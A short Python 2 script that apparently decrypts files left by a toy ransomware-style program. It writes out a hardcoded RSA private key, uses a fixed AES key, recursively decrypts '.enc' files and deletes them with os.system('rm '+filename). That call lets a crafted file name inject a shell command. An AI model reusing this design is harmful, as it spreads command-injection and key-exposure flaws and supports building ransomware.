import os, sys
from crypto import *
from ast import literal_eval

aes_key = 'r'*16
pkeyname="private.pem"


def create_key():
	f= open(pkeyname,"w+")
	f.write('-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAtS5K6YGROGa01x8HhPo2kaKn+Gme3ihCI7dieh09iaAphXbj\nhNsKuE309J8nFZKecuImfQt8bERmerd9ndommIQfJSY9iCzhEOhL5xsSOfqEzFaY\nBTcRdpgKNQBwk7BCsRjSuN8MPvuwaPKG9FxFTOo5lEGz+lFUlhKeVk8YFl8KQCr7\nRNleQ4I+ZHp/3qWWNlD5CGY5O7h7H2j6YlgwDSCmx4yO0xVEV0OHAZkyM4zZzay0\n3/bfYpcnmWUrN2nWlRfHQ6h1uIjjCo5Xafmr6veSASe95V+9uU9FOGFrJggDQSX9\nzLzJfzUoqla429Zd6D4h2zIf0Oyu7srxRBQxIQIDAQABAoIBAQCiaB6qdYQxJI+S\nDbR11Lw5i645lKPdzASNc4MIp1FUHodZpZqIqrhPQUIETO2B/u2dWW7axAMCIcYi\n1nv5lWTnbfdlG4QonuIYf8IaJUAPTKrhZ/XZJuW2gs8Td5NyL5t4mCG7qeSWSJJ3\nYH7saBGOwp5ecQ7doS3LYGEiSL/0vDaaAl5+ZLPP2Tv/c1GpUcg7FMx3KDTrqDJM\n5iyDSqGByrDPFcxNZWwxYQJ88jWsOJkmgD8zKmXsMYZtf7uOrKykKNKAG8ROU06w\n38zidYEGgWaE/TkgJKLp53BH3mmFwhsTRmKQmKn/J1+YrC7C+r3CCC66iZZ2eYjZ\nygDmuN7hAoGBANmg4pdCMstKUlShDkYODMJ+GhcQTw6vUS8lGy5cXCHtPoy5IPbn\n9Zbx2edsb3kavq5z+r4wb/rtuNa6ccb76HI5UZtBojpCyrMKNYvOX8W4rlzpR8Ss\n0IIf3UoCztpPJKSN3mGoXASgrPLA1HEH4+hnBvMDNvOK9lMhoDN9X/r1AoGBANUg\nRIuBcDkzk4yb+IFmq99Q7m7Nh6OkW4W4x18yBxXjYSLXrzO/BA9LMPA8aP6pezNd\nI/Iw5r/Sn5IF/tSSw43kkyGSSCv9Up3VSBAKarl6K2DngUvze0mEAyeDWu/+jdCo\nct/SghF852gWRcnx8HODpb6M2i4y+uKHQ9j90ln9AoGAew09EcmcbtXXN4LZT0Mi\nc9ZZajEOgn8eqEmS1OPkNEqw02DaAsGlW3PkgbYOUauNpZZucJtyta80lDVXn+tP\nw0YlnmO+FrMtaY6cODC4dlO2Q1KkAdC1FN5vgSmVTFrznReaZh2L6hHvuFLPzBlq\nBD4876shpxMrtFWO/44kdwECgYBCN5ZUadD+VMIBK+yX99hqt/B8yKrd8xDkiTaY\noyiEanMhqjWrNCwEvG3mFj7g8LNwj/29H+hxrPUbH3W/giH0EhKMmbCGylxC4aNU\nKIhkPEsB/quzd2DUxIleW3eDnWlebRfT5sm2uUIEmvbv+ZWlrj9u5sBbHkfI3hH8\nd1BF2QKBgAVubCpU7CgiwkMhEGRSALsuYh2Lsny/UW3bB0hd6EhPHP9sYf/DVyfF\n8t7Ewv+bzDIN5XmXCszNLF7YzHNNJhz9fLPO8L8kNML50RTh297ujwpUK5pXUoUe\n7qStmd+Z9lONVf6ZAcBQhIZeLQoQD+pcO9OuVe4sEoJOdWI7ANVv\n-----END RSA PRIVATE KEY-----\n')
	f.close()


def decrypt_(fname):
	key = 'r'*16
	message = literal_eval(open(fname).read())
	dec_message = AESCipher(key).decrypt(str(RSACipher().decrypt(message)))
	dec_name=fname.replace(".enc","")
	f= open(dec_name,"w+")
	f.write(str(dec_message))
	f.close()
	os.system("rm "+fname)


def dec_files(dir_):
	try:
		onlyfiles = [f for f in os.listdir(dir_) if os.path.isfile(os.path.join(dir_, f))]
		for f in onlyfiles:
			splitted = f.split(".")
			if splitted[len(splitted)-1]=="enc":
				file=os.path.join(dir_, f)
				print "Decrypting",file,"..."
				decrypt_(file)
	except ValueError as e:
		print e
		pass

def loop(looped_dir):
	create_key()
	#Files in the root dir
	dec_files(looped_dir)
	#Directories inside
	for root,directories,filenames in os.walk(looped_dir):
		for directory in directories:
			dir=os.path.join(root, directory)
			print "Entering",dir,"..."
			dec_files(dir)
	os.system("rm "+pkeyname)


loop(sys.argv[1])
